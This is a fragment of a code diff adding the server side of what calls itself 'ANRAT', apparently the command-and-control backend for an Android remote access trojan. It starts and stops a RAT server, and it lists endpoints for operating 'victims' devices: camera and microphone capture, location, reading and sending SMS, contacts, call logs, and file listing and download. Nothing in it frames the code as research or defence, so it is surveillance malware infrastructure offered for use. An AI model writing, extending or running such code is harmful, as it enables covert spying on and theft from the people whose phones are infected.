+    await updateDeviceLastActive(deviceId);
+
+    res.json({ success: true, message: 'File download initiated' });
+  } catch (error) {
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Server control endpoints
+app.post('/api/server/start', (req, res) => {
+  const { port = RAT_PORT } = req.body;
+  
+  const success = startRATServer(port);
+  
+  if (success) {
+    res.json({ success: true, message: `Server started on port ${port}` });
+  } else {
+    res.json({ success: false, error: 'Server already running or failed to start' });
+  }
+});
+
+app.post('/api/server/stop', (req, res) => {
+  const success = stopRATServer();
+  
+  if (success) {
+    res.json({ success: true, message: 'Server stopped' });
+  } else {
+    res.json({ success: false, error: 'Server not running or failed to stop' });
+  }
+});
+
+// ========================================
+// START SERVER
+// ========================================
+
+db.getConnection()
+  .then(connection => {
+    console.log('✅ Database connected successfully!');
+    connection.release();
+    
+    // Start API server
+    app.listen(API_PORT, () => {
+      console.log(`\n🚀 ANRAT API Server running on port ${API_PORT}`);
+      console.log(`📡 API Base URL: http://localhost:${API_PORT}/api`);
+      console.log(`\n📚 Available endpoints:`);
+      console.log(`   GET  /api/health`);
+      console.log(`   GET  /api/victims?telegram_id=xxx`);
+      console.log(`   GET  /api/victims/:deviceId?telegram_id=xxx`);
+      console.log(`   POST /api/victims/:deviceId/command`);
+      console.log(`   POST /api/victims/:deviceId/camera`);
+      console.log(`   POST /api/victims/:deviceId/location`);
+      console.log(`   POST /api/victims/:deviceId/sms/list`);
+      console.log(`   POST /api/victims/:deviceId/sms/send`);
+      console.log(`   POST /api/victims/:deviceId/contacts`);
+      console.log(`   POST /api/victims/:deviceId/calls`);
+      console.log(`   POST /api/victims/:deviceId/microphone`);
+      console.log(`   POST /api/victims/:deviceId/files/list`);
+      console.log(`   POST /api/victims/:deviceId/files/download`);
+      console.log(`   POST /api/server/start`);
+      console.log(`   POST /api/server/stop`);
+    });
+    
+    // Auto-start RAT server
+    startRATServer(RAT_PORT);
+    
+  })
+  .catch(error => {
+    console.error('❌ Database connection failed:', error);
+    process.exit(1);
+  });
+
+// Graceful shutdown
+process.on('SIGINT', () => {
+  console.log('\n⏹️  Shutting down gracefully...');
+  stopRATServer();
+  db.end();
+  process.exit(0);
+});
